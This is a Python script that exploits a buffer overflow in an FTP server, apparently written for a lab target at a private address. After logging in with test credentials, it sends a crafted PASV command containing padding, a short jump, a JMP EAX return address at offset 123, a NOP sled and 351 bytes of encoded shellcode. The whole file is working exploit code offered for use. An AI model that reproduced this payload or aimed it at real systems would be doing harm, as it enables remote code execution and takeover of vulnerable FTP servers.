#!/usr/bin/python
import socket


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect=s.connect(('192.168.56.101',21))

# JMP EAX Address : 1001BD23
# [*] Exact match at offset 123

#buf = "A"*3000
buf = "A"*5
buf += "\xeb\x7a" # JMP TO SHELLCODE
buf += "A"*(123-5-2)

#buf += "B"*4
# JMP EAX Address : 1001BD23
buf += "\x23\xbd\x01\x10"
buf += "\x90"*20
# Payload size: 351 bytes
buf += "\xdb\xd3\xbd\xc5\xfa\x46\xb4\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13\x03\xad\xe9\xa4"
buf += "\x41\xd1\xe6\xab\xaa\x29\xf7\xcb\x23\xcc\xc6\xcb\x50"
buf += "\x85\x79\xfc\x13\xcb\x75\x77\x71\xff\x0e\xf5\x5e\xf0"
buf += "\xa7\xb0\xb8\x3f\x37\xe8\xf9\x5e\xbb\xf3\x2d\x80\x82"
buf += "\x3b\x20\xc1\xc3\x26\xc9\x93\x9c\x2d\x7c\x03\xa8\x78"
buf += "\xbd\xa8\xe2\x6d\xc5\x4d\xb2\x8c\xe4\xc0\xc8\xd6\x26"
buf += "\xe3\x1d\x63\x6f\xfb\x42\x4e\x39\x70\xb0\x24\xb8\x50"
buf += "\x88\xc5\x17\x9d\x24\x34\x69\xda\x83\xa7\x1c\x12\xf0"
buf += "\x5a\x27\xe1\x8a\x80\xa2\xf1\x2d\x42\x14\xdd\xcc\x87"
buf += "\xc3\x96\xc3\x6c\x87\xf0\xc7\x73\x44\x8b\xfc\xf8\x6b"
buf += "\x5b\x75\xba\x4f\x7f\xdd\x18\xf1\x26\xbb\xcf\x0e\x38"
buf += "\x64\xaf\xaa\x33\x89\xa4\xc6\x1e\xc6\x09\xeb\xa0\x16"
buf += "\x06\x7c\xd3\x24\x89\xd6\x7b\x05\x42\xf1\x7c\x6a\x79"
buf += "\x45\x12\x95\x82\xb6\x3b\x52\xd6\xe6\x53\x73\x57\x6d"
buf += "\xa3\x7c\x82\x22\xf3\xd2\x7d\x83\xa3\x92\x2d\x6b\xa9"
buf += "\x1c\x11\x8b\xd2\xf6\x3a\x26\x29\x91\x84\x1f\x09\x07"
buf += "\x6d\x62\x69\xc6\xd6\xeb\x8f\xa2\x38\xba\x18\x5b\xa0"
buf += "\xe7\xd2\xfa\x2d\x32\x9f\x3d\xa5\xb1\x60\xf3\x4e\xbf"
buf += "\x72\x64\xbf\x8a\x28\x23\xc0\x20\x44\xaf\x53\xaf\x94"
buf += "\xa6\x4f\x78\xc3\xef\xbe\x71\x81\x1d\x98\x2b\xb7\xdf"
buf += "\x7c\x13\x73\x04\xbd\x9a\x7a\xc9\xf9\xb8\x6c\x17\x01"
buf += "\x85\xd8\xc7\x54\x53\xb6\xa1\x0e\x15\x60\x78\xfc\xff"
buf += "\xe4\xfd\xce\x3f\x72\x02\x1b\xb6\x9a\xb3\xf2\x8f\xa5"
buf += "\x7c\x93\x07\xde\x60\x03\xe7\x35\x21\x69\xd2\x57\x0b"
buf += "\x06\x7b\x02\x09\x4b\x7c\xf9\x4e\x72\xff\x0b\x2f\x81"
buf += "\x1f\x7e\x2a\xcd\xa7\x93\x46\x5e\x42\x93\xf5\x5f\x47"

buf += "C"*(2500-123-4-351-20)

print s.recv(1024)
s.send("USER test\r\n")
print s.recv(1024)
s.send("PASS test\r\n")
print s.recv(1024)

print "Sending %s lenght buffer" % (len(buf))

s.send("PASV " + buf + "\r\n")

print s.recv(1024)

s.close()
